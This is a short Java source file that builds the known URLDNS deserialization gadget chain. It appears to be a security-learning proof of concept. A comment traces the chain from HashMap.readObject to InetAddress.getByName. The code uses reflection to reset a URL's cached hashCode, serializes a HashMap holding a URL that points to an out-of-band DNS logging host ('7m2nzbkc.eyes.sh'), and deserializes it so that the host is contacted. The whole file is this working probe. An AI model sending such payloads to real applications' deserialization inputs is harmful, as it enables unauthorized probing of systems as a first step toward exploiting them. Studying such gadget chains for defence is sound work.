package URLDNSGadget;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;

public class URLDNS {
    /*
    HashMap->readObject() // !!!!!

HashMap->hash()

URL->hashCode()

URLStreamHandler->hashCode()

URLStreamHandler->getHostAddress()

InetAddress->getByName()
     */
    public static void main(String[] args) throws Exception {
        HashMap<Object, String> map = new HashMap<>();
        String url = "http://7m2nzbkc.eyes.sh";
        URL urlObj = new URL(url);

        Field hashCode = urlObj.getClass().getDeclaredField("hashCode");
        hashCode.setAccessible(true);

        hashCode.set(urlObj, 1);
        map.put(urlObj,"nonsense"); // put can trigger URL.hashCode

        hashCode.set(urlObj,-1);
        serialize(map,"ser.bin");
        deserialize("ser.bin");
    }





    public static void serialize(Object obj,String filename) throws Exception {
        FileOutputStream fos = new FileOutputStream(filename);
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(obj);
    }
    public static Object deserialize(String filename) throws Exception {
        FileInputStream fis = new FileInputStream(filename);
        ObjectInputStream ois = new ObjectInputStream(fis);
        return ois.readObject();
    }
}
